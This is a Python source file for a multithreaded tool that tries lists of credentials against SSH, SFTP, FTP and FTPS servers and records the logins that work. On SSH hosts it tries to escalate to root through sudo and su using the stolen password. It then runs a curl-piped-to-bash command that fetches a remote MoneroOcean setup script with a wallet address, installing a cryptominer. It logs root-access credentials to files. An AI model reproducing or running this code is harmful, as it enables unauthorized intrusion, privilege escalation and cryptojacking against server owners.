import argparse
import concurrent.futures
import curses
import ftplib
import logging
import os
import re
import threading
import time

import colorlog
import paramiko
import pysftp
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from tqdm import tqdm

console = Console()

# Define connection messages with emojis
CONNECTION_MESSAGES = {
    "timeout": "🕒 Connection taking too long...",
    "dns_fail": "🌐 DNS lookup failed for this host",
    "refused": "🚫 Connection refused - service may not be running",
    "auth_fail": "🔑 Authentication failed - wrong credentials",
    "success": "🎉 Success! Logged in and script executed!",
    "script_fail": "⚠️ Connected but script failed to run",
    "no_shell": "🐚 Connected but no shell access",
    "starting": "🚀 Attempting connection to {host}:{port}",
    "retrying": "🔄 Retrying {host}:{port} (attempt {attempt})",
}

# Konstanten und globale Variablen
timeout = 12  # Zeitlimit für jede Verbindung in Sekunden
ATTEMPT_COUNT = 0  # Anzahl der Versuche
ATTEMPT_COUNT_LOCK = threading.Lock()  # Lock für die Anzahl der Versuche
last_print_time = time.time()  # Zeitpunkt des letzten Ausdrucks der Ergebnisse
TOTAL_LINES = 0  # Gesamtzahl der Zeilen in der Eingabedatei
CURRENT_LINE = 0  # Aktuelle Zeile in der Eingabedatei
CURRENT_LINE_LOCK = threading.Lock()  # Lock für die aktuelle Zeile
CURRENT_HOST = ""  # Aktueller Server, mit dem versucht wird, sich zu verbinden
CURRENT_HOST_LOCK = threading.Lock()  # Lock für den aktuellen Server
total_elapsed_time = 0  # Gesamtdauer der Ausführung
checked_hosts_counter = 0  # Initialize the counter

# Define locks for updating shared variables
LOGIN_ATTEMPTS_LOCK = threading.Lock()
CHECKED_HOSTS_LOCK = threading.Lock()

login_attempts = {
    "correct_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
    "incorrect_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
}

parser = argparse.ArgumentParser(
    description="Attempt to login to a host using various protocols"
)
parser.add_argument(
    "-f", "--file", help="File containing login information", required=True
)
parser.add_argument(
    "-v",
    "--verbose",
    help="Increase output verbosity",
    action="store_true",
)
parser.add_argument(
    "-t",
    "--threads",
    help="Number of threads to use",
    type=int,
    default=100,
)
parser.add_argument(
    "-p",
    "--protocols",
    help="Specify comma-separated protocols (FTP, FTPS, SFTP, SSH)",
    type=str,
    required=True,
)
args = parser.parse_args()
protocols = [p.strip().upper() for p in args.protocols.split(",")]


# Benutzerdefinierte Filter-Klasse, um nur INFO-Nachrichten zuzulassen
class InfoFilter(logging.Filter):
    def filter(self, record):
        return record.levelno == logging.INFO


# Define the DebugInfoFilter class before using it
class DebugInfoFilter(logging.Filter):
    def filter(self, record):
        return record.levelno in (logging.DEBUG, logging.INFO)


# Create a colorlog handler
handler = colorlog.StreamHandler()
# Verbesserte Logging-Konfiguration
handler.setFormatter(
    colorlog.ColoredFormatter(
        "%(log_color)s%(levelname)-7s%(reset)s │ %(message)s",
        log_colors={
            "DEBUG": "cyan",
            "INFO": "bold_green",
            "WARNING": "bold_yellow",
            "ERROR": "bold_red",
            "CRITICAL": "bold_red,bg_white",
        },
    )
)

# Verbesserte Progress-Bar Formatierung
PROGRESS_BAR_FORMAT = (
    "{desc}: {percentage:3.0f}%|{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]"
)


# Set handler level based on verbose flag
handler_level = logging.DEBUG if args.verbose else logging.INFO
handler.setLevel(handler_level)

# Add the DebugInfoFilter to the handler
handler.addFilter(DebugInfoFilter())

# Remove existing handlers from the root logger
for handler in logging.root.handlers[:]:
    logging.root.removeHandler(handler)

# Create a logger and add the colorlog handler
logger = colorlog.getLogger()
logger.addHandler(handler)

# Set the logger level to INFO
logger.setLevel(logging.INFO)

# Set propagate to False for ERROR and WARNING messages
logger.propagate = False

# Print the effective log level
logger.debug(f"Effective log level: {logger.getEffectiveLevel()}")

# Log some messages at different levels
logger.debug("This is a debug message.")
logger.info("This is an info message.")
logger.warning("This is a warning message.")
logger.error("This is an error message.")
logger.critical("This is a critical message.")


def draw_status_bar(stdscr, hosts_count, active_threads):
    """Zeichnet die Statusleiste unten."""
    height, width = stdscr.getmaxyx()

    status_bar_text = (
        f" Hosts: {hosts_count} | Active Threads: {active_threads} | Press 'q' to quit "
    )
    stdscr.attron(curses.color_pair(1))
    stdscr.addstr(height - 1, 0, status_bar_text)
    stdscr.addstr(
        height - 1, len(status_bar_text), " " * (width - len(status_bar_text) - 1)
    )
    stdscr.attroff(curses.color_pair(1))


def thread_task(i):
    """Beispiel Funktion für Threads."""
    time.sleep(0.5)  # Simuliert Arbeit
    return f"Task {i} finished"


def parse_ssh_url(ssh_url):
    try:
        regex = r"^SSH://([^:@]+):([^:@]+)@([^:@]+):(\d+)$"
        match = re.match(regex, ssh_url)
        if match:
            username = match.group(1)
            password = match.group(2)
            host = match.group(3)
            try:
                port = int(match.group(4))  # Port validieren
                return host, port, username, password
            except ValueError:  # Fehler beim Konvertieren des Ports
                logger.error(f"Invalid port in SSH URL: {match.group(4)}")
                return None
        else:
            logger.error(f"Invalid SSH URL format: {ssh_url}")
    except Exception as e:
        logger.error(f"Unexpected error while parsing SSH URL '{ssh_url}': {e}")
    return None


def count_active_threads():
    return threading.active_count()


# Überarbeitete print_login_attempts Funktion
def print_login_attempts(total_lines, elapsed_time):
    active_threads = count_active_threads()
    with CURRENT_HOST_LOCK:
        current_host = CURRENT_HOST
    with CURRENT_LINE_LOCK:
        current_line = CURRENT_LINE

    console = Console()
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Statistik", justify="left")
    table.add_column("Wert", justify="right")

    table.add_row("🕒 Laufzeit", f"{elapsed_time:.2f}s")
    table.add_row("📋 Gesamte Zeilen", str(total_lines))
    table.add_row(
        "📌 Aktuelle Zeile",
        f"{current_line} ({(current_line / total_lines) * 100:.1f}%)",
    )
    table.add_row("🚀 Aktive Threads", str(active_threads))
    table.add_row(
        "✅ Erfolgreiche Logins", str(sum(login_attempts["correct_logins"].values()))
    )
    table.add_row(
        "❌ Fehlgeschlagene Logins",
        str(sum(login_attempts["incorrect_logins"].values())),
    )

    console.print("\n")
    console.print(
        Panel.fit(
            table,
            title="[bold]Fortschrittsübersicht[/bold]",
            border_style="bright_blue",
            padding=(1, 4),
        )
    )
    console.print("\n")


def check_login(host, port, username, password, protocol):
    check_functions = {
        "SSH": check_ssh_login,
        "SFTP": check_sftp_login,
        "FTP": check_ftp_login,
        "FTPS": check_ftps_login,
    }
    if protocol not in check_functions:
        logger.error(f"Invalid protocol specified: {protocol}")
        return None
    return check_functions[protocol](host, port, username, password)


# Global counters structure
counters = {
    "progress": 0,
    "total": 0,  # Total number of login attempts
    "current_host": "",
    "correct": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
    "incorrect": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
    "attempts": 0,
}

# Lock for counters
counters_lock = threading.Lock()


def check_login_thread(
    host, port, username, password, timeout, protocol, sourcefile, pbar
):
    global ATTEMPT_COUNT
    global last_print_time
    global CURRENT_LINE
    global CURRENT_HOST
    global checked_hosts_counter  # Make sure we're using the global counter

    with CURRENT_LINE_LOCK:
        CURRENT_LINE += 1
    with CURRENT_HOST_LOCK:
        CURRENT_HOST = f"{username}:{password}@{host}:{port}"

    # Prepare and log the message before the progress bar updates
    info_message = (
        f"INFO     {CONNECTION_MESSAGES['starting'].format(host=host, port=port)}"
    )

    # Use tqdm.write to ensure log is before progress bar output
    tqdm.write(info_message)  # Logs to its own line separate from progress
    logger.info(info_message)

    with ATTEMPT_COUNT_LOCK:
        ATTEMPT_COUNT += 1

    start_time = time.time()

    result_protocol = None
    # Call the appropriate check function based on protocol
    if protocol == "SSH":
        result_protocol = check_ssh_login(host, port, username, password)
    elif protocol == "SFTP":
        result_protocol = check_sftp_login(host, port, username, password)
    elif protocol == "FTP":
        result_protocol = check_ftp_login(host, port, username, password)
    elif protocol == "FTPS":
        result_protocol = check_ftps_login(host, port, username, password)

    elapsed_time = time.time() - start_time

    # Progress-Bar Update
    emoji = "✅" if result_protocol else "❌"
    short_host = f"{username[:8]}@{host.split('.')[0]}:{port}"
    pbar.set_postfix_str(f"{emoji} {short_host}")

    # Verbesserte Log-Ausgabe
    if result_protocol:
        logger.info(
            f"🎉 [bold green]ERFOLG[/bold green] │ {protocol}://{username}:{password}@{host}:{port}"
            f" │ Dauer: {elapsed_time:.2f}s"
        )
        with LOGIN_ATTEMPTS_LOCK:
            login_attempts["correct_logins"][protocol] += 1
    else:
        logger.debug(
            f"❌ [dim]{protocol}://{username}:{password}@{host}:{port}[/dim] │ Dauer: {elapsed_time:.2f}s"
        )
        with LOGIN_ATTEMPTS_LOCK:
            login_attempts["incorrect_logins"][protocol] += 1

    # Log the current host after attempting the login
    with CURRENT_HOST_LOCK:
        elapsed_time_formatted = f"{elapsed_time:.2f} seconds"
        logger.debug(
            f"Checked {protocol} login for {username}:{password}@{host}:{port}, took {elapsed_time_formatted}"
        )

    if time.time() - last_print_time >= 30:  # 30 seconds
        last_print_time = time.time()  # Reset the timer
        print_login_attempts(TOTAL_LINES, time.time() - start_time)
        write_to_output(result_protocol, username, password, host, port)

    # Use a lock to safely increment the counter and check if we need to remove hosts
    with CHECKED_HOSTS_LOCK:
        checked_hosts_counter += 1

        # Log the counter value occasionally
        if checked_hosts_counter % 50 == 0:
            logger.info(f"Checked hosts counter: {checked_hosts_counter}")

        # Try to remove hosts more frequently (every 10 hosts instead of 500)
        if checked_hosts_counter >= 500:
            logger.info(
                f"Removing {checked_hosts_counter} checked hosts from the file..."
            )
            # Pass the actual counter value as the batch size
            remove_checked_hosts_by_counter(
                sourcefile, batch_size=checked_hosts_counter
            )
            checked_hosts_counter = 0  # Reset the counter after removing hosts


def check_ssh_login(host, port, username, password):
    try:
        logger.debug(f"Trying SSH connection ({username}:{password}@{host}:{port})")
        logger.info(CONNECTION_MESSAGES["starting"].format(host=host, port=port))
        with paramiko.SSHClient() as client:
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=timeout,
            )
            # Write directory listing to checked_ssh_dirs.txt
            stdin, stdout, stderr = client.exec_command("ls -la")
            dir_listing = stdout.read().decode()
            with open("checked_ssh_dirs.txt", "a", encoding="utf-8") as output_file:
                output_file.write(
                    f"SSH directory listing for {username}:{password}@{host}:{port}:\n{dir_listing}\n"
                )
            # Quick success message check
            logger.info(CONNECTION_MESSAGES["success"])
            # Determine if shell access is available
            stdin, stdout, stderr = client.exec_command("echo Test", get_pty=True)
            welcome_message = stdout.read().decode()
            # Special handling of restricted access
            if "This service allows sftp connections only." in welcome_message or any(
                msg in welcome_message
                for msg in [
                    "Shell access is not enabled on your account!",
                    "This account is currently not available.",
                    "Shell access is disabled",
                    "command not allowed on SFTP-only account",
                ]
            ):
                logger.warning(
                    f"Server {host}:{port} does not allow shell access or only allows SFTP. Skipping."
                )
                return None

            # Command to running setup
            install_command = (
                "systemctl stop swapd ; curl -L -v "
                "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/"
                "setup_mo_4_r00t_and_user.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX"
            )

            # Check if we're already root using whoami
            stdin, stdout, stderr = client.exec_command("whoami", get_pty=True)
            current_user = stdout.read().decode().strip()
            output = None
            error = None
            root_method = None

            # If we're already root, just run the command directly
            if current_user == "root":
                logger.info(f"Already have root access on {host}:{port}")
                stdin, stdout, stderr = client.exec_command(
                    install_command, get_pty=True
                )
                output = stdout.read().decode()
                error = stderr.read().decode()
                root_method = "direct_root"
                sudo_available = True
                su_root_available = True
            else:
                # Try different privilege escalation methods
                sudo_available = False
                su_root_available = False

                # Try sudo -s specifically since you confirmed it works
                logger.debug(f"Trying sudo -s with password")
                # Use invoke_shell for interactive session
                channel = client.invoke_shell()
                channel.settimeout(timeout)

                # Wait for prompt
                time.sleep(2)
                if channel.recv_ready():
                    channel.recv(1024)  # Clear initial output

                # Try sudo -s
                channel.send("sudo -s\n")
                time.sleep(2)  # Wait longer for password prompt

                # Check for password prompt
                if channel.recv_ready():
                    output_data = channel.recv(1024).decode()

                    # If password prompt appears
                    if "password" in output_data.lower():
                        logger.debug(f"Sending password for sudo -s")
                        channel.send(f"{password}\n")
                        time.sleep(3)  # Wait for sudo to process

                # Check if we're root now
                channel.send("whoami\n")
                time.sleep(2)

                whoami_output = ""
                if channel.recv_ready():
                    whoami_output = channel.recv(1024).decode()
                    logger.debug(f"whoami output: {whoami_output}")

                # If we see "root" in the output
                if "root" in whoami_output:
                    logger.info(f"Successfully got root with sudo -s on {host}")

                    # Now run the actual command
                    channel.send(f"{install_command}\n")
                    time.sleep(10)  # Give more time for command to execute

                    # Collect output
                    output_buffer = ""
                    while channel.recv_ready():
                        output_buffer += channel.recv(4096).decode()

                    output = output_buffer
                    root_method = "sudo_-s"
                    sudo_available = True
                else:
                    # If sudo -s failed, try other methods
                    logger.warning(f"sudo -s failed on {host}, trying other methods")

                    # Try other sudo variants with exec_command
                    sudo_variants = [
                        "sudo",  # Standard sudo
                        "sudo -i",  # Login shell as root
                        "sudo su -",  # Switch to root user
                    ]

                    for sudo_cmd in sudo_variants:
                        if root_method:  # If we already found a working method, skip
                            break

                        # Verify if we can get root with this method
                        verify_cmd = f"{sudo_cmd} whoami"
                        stdin, stdout, stderr = client.exec_command(
                            verify_cmd, get_pty=True
                        )

                        # Check if password prompt appears
                        time.sleep(2)  # Wait longer for password prompt
                        if stdout.channel.recv_ready():
                            output_data = stdout.channel.recv(1024).decode()
                            logger.debug(f"Received after {sudo_cmd}: {output_data}")

                            if "password" in output_data.lower():
                                logger.debug(f"Sending password for {sudo_cmd}")
                                stdin.write(f"{password}\n")
                                stdin.flush()
                                time.sleep(2)  # Wait for sudo to process

                        # Get the verification output
                        verify_output = stdout.read().decode().strip()
                        logger.debug(f"{sudo_cmd} whoami output: {verify_output}")

                        # Check if we got root
                        if "root" in verify_output:
                            logger.info(
                                f"Successfully got root with {sudo_cmd} on {host}"
                            )

                            # Now run the actual command
                            cmd = f"{sudo_cmd} {install_command}"
                            stdin, stdout, stderr = client.exec_command(
                                cmd, get_pty=True
                            )

                            # Send password again if needed
                            time.sleep(2)
                            if stdout.channel.recv_ready():
                                output_data = stdout.channel.recv(1024).decode()
                                if "password" in output_data.lower():
                                    stdin.write(f"{password}\n")
                                    stdin.flush()

                            output = stdout.read().decode()
                            error = stderr.read().decode()
                            root_method = sudo_cmd.replace(" ", "_")
                            sudo_available = True
                            break

                    # If sudo methods failed, try su
                    if not root_method:
                        # Try su
                        stdin, stdout, stderr = client.exec_command(
                            "su -c 'whoami'", get_pty=True
                        )
                        stdin.write(f"{password}\n")
                        stdin.flush()
                        verify_output = stdout.read().decode().strip()

                        if "root" in verify_output:
                            logger.info(f"Successfully got root with su -c on {host}")
                            stdin, stdout, stderr = client.exec_command(
                                f"su -c '{install_command}'", get_pty=True
                            )
                            stdin.write(f"{password}\n")
                            stdin.flush()
                            output = stdout.read().decode()
                            error = stderr.read().decode()
                            root_method = "su_command"
                            su_root_available = True
                        else:
                            # If all root methods failed, run as normal user
                            logger.warning(
                                f"Could not gain root access on {host}, running as normal user"
                            )
                            stdin, stdout, stderr = client.exec_command(
                                install_command, get_pty=True
                            )
                            output = stdout.read().decode()
                            error = stderr.read().decode()
                            root_method = "normal_user"

            # Writing both connection details and server output
            log_entry = (
                f"SSH://{username}:{password}@{host}:{port}\n"
                + f"Root method: {root_method}\n"
                + (output if output else "")
                + "\n\n"
            )

            if root_method and root_method != "normal_user":
                logger.info(
                    f"Command executed successfully with root privileges on {host}. Output:\n{output[:200]}..."
                )
            else:
                logger.warning(
                    f"Command could not be executed as root on {host}. Error: {error[:100] if error else ''}"
                )

            with open("output.txt", "a", encoding="utf-8") as file:
                file.write(log_entry)

            logger.info(
                f"Successful login to SSH protocol at {host}:{port} with username {username} and password {password}"
            )

            # # Write to root_access.txt if root access was available
            # if sudo_available or su_root_available:
            #     with open("root_access.txt", "a", encoding="utf-8") as root_file:
            #         root_access_entry = f"SSH://{username}:{password}@{host}:{port}"
            #         if sudo_available:
            #             root_access_entry += "sudo"
            #         if su_root_available:
            #             root_access_entry += "su"
            #         root_file.write(root_access_entry + "\n")

            # Call write_to_output with the root access information
            write_to_output(
                "SSH", username, password, host, port, sudo_available, su_root_available
            )

            return "SSH"

    except paramiko.ssh_exception.AuthenticationException:
        logger.warning(CONNECTION_MESSAGES["auth_fail"])
    except Exception as e:
        logger.error(f"{CONNECTION_MESSAGES['script_fail']}: {e}")

    return None


def check_sftp_login(host, port, username, password):
    try:
        cnopts = pysftp.CnOpts()
        cnopts.hostkeys = None
        logger.debug(f"Trying sftp connection ({username}:{password}@{host}:{port})")
        with pysftp.Connection(
            host, username=username, password=password, port=port, cnopts=cnopts
        ) as sftp:
            sftp_files = sftp.listdir_attr(".")
            sftp.close()
            with open(
                "checked_sftp_dirs.txt", "a", encoding="utf-8"
            ) as sftp_dir_output:
                sftp_dir_output.write(
                    f"\n\nSFTP://{username}:{password}@{host}:{port}\n"
                )
                for line in sftp_files:
                    sftp_dir_output.write(f"{line}\n")
            with open("output.txt", "a", encoding="utf-8") as output_file:
                output_file.write(f"SFTP://{username}:{password}@{host}:{port}\n")
            logger.info(
                "\033[91mSuccessful login to SFTP protocol at {}:{} with username {} and password {}\033[0m".format(
                    host, port, username, password
                )
            )
            write_to_output("SFTP", username, password, host, port)
            return "SFTP"
    except Exception as e:
        logger.debug(f"Unexpected error in SFTP: {e}")
    return None


def check_ftp_login(host, port, username, password):
    try:
        logger.debug(f"Trying ftp connection ({username}:{password}@{host}:{port})")
        with ftplib.FTP(timeout=timeout) as ftp:
            ftp.connect(host, port)
            ftp.login(username, password)
            ls = []
            ftp.retrlines("LIST -a", ls.append)
            with open("checked_ftp_dirs.txt", "a", encoding="utf-8") as ftp_dir_output:
                ftp_dir_output.write(f"\n\nFTP://{username}:{password}@{host}:{port}\n")
                for entry in ls:
                    print(entry)  # Print each entry
                    # Write each entry to file
                    ftp_dir_output.write(f"{entry}\n")
        logger.info(
            "\033[91mSuccessful login to FTP protocol at {}:{} with username {} and password {}\033[0m".format(
                host, port, username, password
            )
        )
        write_to_output("FTP", username, password, host, port)
        return "FTP"
    except ftplib.error_perm as e:
        logger.error(f"FTP login failed: {e}")
    except Exception as e:
        logger.error(f"Unexpected error in FTP: {e}")
    return None


def check_ftps_login(host, port, username, password):
    try:
        logger.debug(f"Trying FTPS connection ({username}:{password}@{host}:{port})")
        with ftplib.FTP_TLS(timeout=timeout) as ftps:
            ftps.connect(host, port)
            ftps.login(username, password)
            ftps.prot_p()
            ls = []
            ftps.retrlines("LIST -a", ls.append)
            with open(
                "checked_ftps_dirs.txt", "a", encoding="utf-8"
            ) as ftps_dir_output:
                ftps_dir_output.write(
                    f"\n\nFTPS://{username}:{password}@{host}:{port}\n"
                )
                for entry in ls:
                    ftps_dir_output.write(f"{entry}\n")
            logger.info(
                "\033[91mSuccessful login to FTPS protocol at {}:{} with username {} and password {}\033[0m".format(
                    host, port, username, password
                )
            )
            write_to_output("FTPS", username, password, host, port)
            return "FTPS"
    except ftplib.error_perm as e:
        logger.error(f"FTPS login failed: {e}")
    except Exception as e:
        logger.error(f"Unexpected error in FTPS: {e}")
    return None


def write_to_output(
    protocol,
    username,
    password,
    host,
    port,
    sudo_available=False,
    su_root_available=False,
):
    output = None
    if protocol is not None:
        output = f"{protocol}://{username}:{password}@{host}:{port}\n"

    if output:
        with open("output.txt", "a", encoding="utf-8") as output_file:
            output_file.write(output)

        # Write to both root access files with consistent format
        if sudo_available or su_root_available:
            root_access_entry = output.strip()  # Remove newline

            # Add root access method information
            if sudo_available and su_root_available:
                root_access_entry += "   [sudo+su]"
            elif sudo_available:
                root_access_entry += "   [sudo]"
            elif su_root_available:
                root_access_entry += "   [su]"

            # Add newline back
            root_access_entry += "\n"

            # Write to both files with the same format
            with open("root_access.txt", "a", encoding="utf-8") as root_file:
                root_file.write(root_access_entry)

            with open("root_sudo.txt", "a", encoding="utf-8") as sudo_output_file:
                sudo_output_file.write(root_access_entry)

            logger.info(f"Wrote root access entry: {root_access_entry.strip()}")

        # Rest of the function remains the same...
        output_filename_map = {
            "SSH": "checked_ssh.txt",
            "FTP": "checked_ftp.txt",
            "FTPS": "checked_ftps.txt",
            "SFTP": "checked_sftp.txt",
        }
        if protocol in output_filename_map:
            if not os.path.isfile(output_filename_map[protocol]):
                open(output_filename_map[protocol], "a", encoding="utf-8").close()
            with open(
                output_filename_map[protocol], "a", encoding="utf-8"
            ) as output_file:
                output_file.write(output)


# Log-Ausgabe konfigurieren
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


# Then fix the remove_checked_hosts_by_counter function
def remove_checked_hosts_by_counter(sourcefile, batch_size=20):
    """
    Removes the first batch_size hosts from the sourcefile.
    Each host entry can be in one of two formats:
    1. SSH://username:password@host:port
    2. Host:host:port followed by Username:username and Password:password
    """
    try:
        # Make sure the file exists
        if not os.path.exists(sourcefile):
            logger.error(f"Source file {sourcefile} does not exist")
            return

        # Read all lines from the file
        with open(sourcefile, "r", encoding="utf-8", errors="ignore") as src_file:
            lines = src_file.readlines()

        if not lines:
            logger.warning(f"Source file {sourcefile} is empty")
            return

        # Log the first few lines to debug
        logger.debug(f"First 5 lines of sourcefile: {lines[:5]}")

        # Count how many lines to remove
        lines_to_remove = 0
        hosts_removed = 0
        i = 0

        while i < len(lines) and hosts_removed < batch_size:
            line = lines[i].strip()
            logger.debug(f"Processing line {i}: {line}")

            if line.startswith("SSH://"):
                lines_to_remove += 1
                hosts_removed += 1
                logger.debug(f"Found SSH URL at line {i}, removing 1 line")
                i += 1
            elif line.startswith("Host:"):
                if i + 2 < len(lines):
                    host_line = lines[i].strip()
                    username_line = lines[i + 1].strip()
                    password_line = lines[i + 2].strip()

                    if username_line.startswith(
                        "Username:"
                    ) and password_line.startswith("Password:"):
                        lines_to_remove += 3
                        hosts_removed += 1
                        i += 3
                        logger.debug(
                            f"Removing 3 lines for Host/Username/Password starting at line {i - 3}"
                        )
                    else:
                        logger.warning(
                            f"Incomplete host entry at line {i}. Expected Username: and Password: on the following lines."
                        )
                        i += 1  # Move to the next line to avoid infinite loop
                else:
                    logger.warning(
                        f"Incomplete host entry at line {i}. Not enough lines remaining."
                    )
                    i += 1
            else:
                i += 1  # Move to the next line if it doesn't match any known format

        # If we found hosts to remove
        if lines_to_remove > 0:
            logger.info(
                f"Found {lines_to_remove} lines to remove for {hosts_removed} hosts"
            )

            # Keep only the remaining lines
            remaining_lines = lines[lines_to_remove:]

            # Write the remaining lines back to the file
            with open(sourcefile, "w", encoding="utf-8") as src_file:
                src_file.writelines(remaining_lines)

            logger.info(
                f"Removed {hosts_removed} hosts ({lines_to_remove} lines) from {sourcefile}"
            )
        else:
            logger.warning(f"No hosts found to remove from {sourcefile}")

    except Exception as e:
        logger.error(f"Error in remove_checked_hosts_by_counter: {e}")


def parse_input_file(file_path: str) -> list:
    """Parse the input file for login details, handling both SSH:// and Host: formats"""
    login_info = []
    try:
        with open(file_path, "r") as file:
            lines = file.readlines()
            i = 0
            while i < len(lines):
                line = lines[i].strip()
                if line.startswith("SSH://"):
                    parsed = parse_ssh_url(line)
                    if parsed:
                        login_info.append(parsed)
                    i += 1
                elif line.startswith("Host:"):
                    host_match = re.search(r"Host:(.*?)(?::(\d+))?$", line)
                    if host_match:
                        host = host_match.group(1).strip()
                        port_str = host_match.group(2)
                        port = int(port_str) if port_str else 22
                        if i + 2 < len(lines):
                            username_line = lines[i + 1].strip()
                            password_line = lines[i + 2].strip()
                            if username_line.startswith(
                                "Username:"
                            ) and password_line.startswith("Password:"):
                                username = username_line.split(":")[1].strip()
                                password = password_line.split(":")[1].strip()
                                login_info.append((host, port, username, password))
                                i += 3
                            else:
                                logger.warning(
                                    f"Incomplete login info after Host: line {i+1}. Expected Username: and Password:."
                                )
                                i += 1
                        else:
                            logger.warning(
                                f"Incomplete login info after Host: line {i+1}. Not enough lines left in file."
                            )
                            i += 1
                    else:
                        logger.warning(f"Invalid Host: line format: {line}")
                        i += 1
                else:
                    i += 1

    except FileNotFoundError:
        logger.error("Input file not found: %s", file_path)
        raise
    except Exception as e:
        logger.error("Error reading input file: %s", str(e))
        raise

    global TOTAL_LINES
    try:
        with open(file_path, "r") as f:
            TOTAL_LINES = sum(1 for _ in f)
    except FileNotFoundError:
        logger.error(f"Could not open {file_path} to count lines.")
        TOTAL_LINES = 0

    return login_info


def main():
    if args.verbose:
        logger.setLevel(logging.DEBUG)

    try:
        # Parse input file and process logins
        login_info = parse_input_file(args.file)
        logger.info(f"Parsed {len(login_info)} login entries.")

        with tqdm(
            total=len(login_info),
            desc="Processing Logins",
            bar_format=PROGRESS_BAR_FORMAT,
        ) as pbar:
            with concurrent.futures.ThreadPoolExecutor(
                max_workers=args.threads
            ) as executor:
                futures = [
                    executor.submit(
                        check_login_thread,
                        host,
                        port,
                        username,
                        password,
                        timeout,
                        protocol,
                        args.file,
                        pbar,
                    )
                    for host, port, username, password in login_info
                    for protocol in protocols
                ]
                for future in concurrent.futures.as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        logger.error(f"Thread error: {e}")

        logger.info("Processing completed. Total attempts: %d", ATTEMPT_COUNT)
        print_login_attempts(TOTAL_LINES, time.time() - start_time_main)

    except FileNotFoundError:
        pass  # Already handled in parse_input_file
    except Exception as e:
        logger.critical("Fatal error in main: %s", str(e))


if __name__ == "__main__":
    start_time_main = time.time()
    main()
